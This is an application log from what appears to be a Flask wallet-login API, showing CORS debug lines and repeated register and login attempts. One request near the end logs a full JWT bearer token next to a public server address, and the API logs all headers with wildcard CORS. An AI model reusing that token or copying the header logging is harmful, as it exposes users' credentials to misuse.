2025-07-09 11:27:55,462 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 11:28:03,697 - api.auth - INFO - Received login request with method: POST
2025-07-09 11:28:03,697 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Content-Length': '77', 'Accept-Language': 'fr-FR,fr;q=0.9'}
2025-07-09 11:28:03,697 - api.auth - INFO - Request content type: application/json
2025-07-09 11:28:03,697 - api.auth - INFO - Processing JSON request
2025-07-09 11:28:03,698 - api.auth - INFO - Attempting to authenticate user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 11:28:03,852 - api.auth - WARNING - Invalid credentials for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Invalid credentials
2025-07-09 11:28:03,852 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 11:28:03,852 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 11:28:03,852 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 11:28:03,853 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 11:28:15,596 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 11:28:15,596 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 11:28:15,596 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 11:28:15,596 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-09 11:28:15,635 - api.auth - INFO - Received register request with method: POST
2025-07-09 11:28:15,635 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Content-Length': '138', 'Accept-Language': 'fr-FR,fr;q=0.9'}
2025-07-09 11:28:15,635 - api.auth - INFO - Request content type: application/json
2025-07-09 11:28:15,636 - api.auth - INFO - Processing JSON request
2025-07-09 11:28:15,636 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 11:28:15,641 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 11:28:15,641 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 11:28:15,642 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 11:28:15,642 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 11:28:15,642 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 11:28:16,904 - api.auth - INFO - Received register request with method: POST
2025-07-09 11:28:16,904 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Content-Length': '138', 'Accept-Language': 'fr-FR,fr;q=0.9'}
2025-07-09 11:28:16,904 - api.auth - INFO - Request content type: application/json
2025-07-09 11:28:16,904 - api.auth - INFO - Processing JSON request
2025-07-09 11:28:16,905 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 11:28:16,909 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 11:28:16,909 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 11:28:16,909 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 11:28:16,909 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 11:28:16,910 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 11:28:17,078 - api.auth - INFO - Received register request with method: POST
2025-07-09 11:28:17,078 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Content-Length': '138', 'Accept-Language': 'fr-FR,fr;q=0.9'}
2025-07-09 11:28:17,078 - api.auth - INFO - Request content type: application/json
2025-07-09 11:28:17,078 - api.auth - INFO - Processing JSON request
2025-07-09 11:28:17,079 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 11:28:17,082 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 11:28:17,082 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 11:28:17,082 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 11:28:17,083 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 11:28:17,083 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 11:28:19,798 - api.auth - INFO - Received register request with method: POST
2025-07-09 11:28:19,798 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Content-Length': '138', 'Accept-Language': 'fr-FR,fr;q=0.9'}
2025-07-09 11:28:19,798 - api.auth - INFO - Request content type: application/json
2025-07-09 11:28:19,798 - api.auth - INFO - Processing JSON request
2025-07-09 11:28:19,801 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 11:28:19,806 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 11:28:19,806 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 11:28:19,806 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 11:28:19,806 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 11:28:19,806 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 11:29:20,284 - api.auth - INFO - Received register request with method: POST
2025-07-09 11:29:20,284 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Content-Length': '138', 'Accept-Language': 'fr-FR,fr;q=0.9'}
2025-07-09 11:29:20,285 - api.auth - INFO - Request content type: application/json
2025-07-09 11:29:20,285 - api.auth - INFO - Processing JSON request
2025-07-09 11:29:20,285 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 11:29:20,290 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 11:29:20,291 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 11:29:20,291 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 11:29:20,291 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 11:29:20,291 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 11:29:21,601 - api.auth - INFO - Received register request with method: POST
2025-07-09 11:29:21,602 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Content-Length': '138', 'Accept-Language': 'fr-FR,fr;q=0.9'}
2025-07-09 11:29:21,602 - api.auth - INFO - Request content type: application/json
2025-07-09 11:29:21,602 - api.auth - INFO - Processing JSON request
2025-07-09 11:29:21,602 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 11:29:21,607 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 11:29:21,607 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 11:29:21,607 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 11:29:21,608 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 11:29:21,608 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 11:30:12,298 - api.auth - INFO - Received register request with method: POST
2025-07-09 11:30:12,298 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Content-Length': '129', 'Accept-Language': 'fr-FR,fr;q=0.9'}
2025-07-09 11:30:12,298 - api.auth - INFO - Request content type: application/json
2025-07-09 11:30:12,298 - api.auth - INFO - Processing JSON request
2025-07-09 11:30:12,298 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3R
2025-07-09 11:30:12,451 - api.auth - INFO - Registration successful for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3R
2025-07-09 11:30:12,451 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 11:30:12,451 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 11:30:12,451 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 11:30:12,451 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 11:30:25,395 - api.auth - INFO - Received login request with method: POST
2025-07-09 11:30:25,395 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Content-Type': 'application/json', 'Origin': 'http://localhost:4456', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Referer': 'http://localhost:4456/', 'Content-Length': '79', 'Accept-Language': 'fr-FR,fr;q=0.9'}
2025-07-09 11:30:25,395 - api.auth - INFO - Request content type: application/json
2025-07-09 11:30:25,395 - api.auth - INFO - Processing JSON request
2025-07-09 11:30:25,396 - api.auth - INFO - Attempting to authenticate user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3R
2025-07-09 11:30:25,535 - api.auth - INFO - Authentication successful for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3R
2025-07-09 11:30:25,536 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 11:30:25,536 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 11:30:25,536 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 11:30:25,536 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 12:10:42,603 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-07-09 12:10:42,724 - app - INFO - Application started
2025-07-09 12:26:25,386 - flask_cors.extension - DEBUG - Configuring CORS with resources: {'/*': {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}}
2025-07-09 12:26:25,489 - app - INFO - Application started
2025-07-09 12:27:52,706 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 12:27:52,706 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 12:27:52,706 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 12:27:52,707 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-09 12:27:52,718 - api.auth - INFO - Received login request with method: POST
2025-07-09 12:27:52,718 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '84', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweDIwMUI5ZjJDMTQ3MTVEZjYwQzk0ODJCNTQ1N2QwNUI2NzAzMUY4NzEiLCJleHAiOjE3NTIwMDE4NjN9.oQrTdt24rm9yRoR1RZ2rhmITV31XygJo4vZ88fyCvbw', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 12:27:52,718 - api.auth - INFO - Request content type: application/json
2025-07-09 12:27:52,718 - api.auth - INFO - Processing JSON request
2025-07-09 12:27:52,719 - api.auth - INFO - Attempting to authenticate user with wallet: 0x201B9f2C14715Df60C9482B5457d05B67031F871
2025-07-09 12:27:52,880 - api.auth - INFO - Authentication successful for wallet: 0x201B9f2C14715Df60C9482B5457d05B67031F871
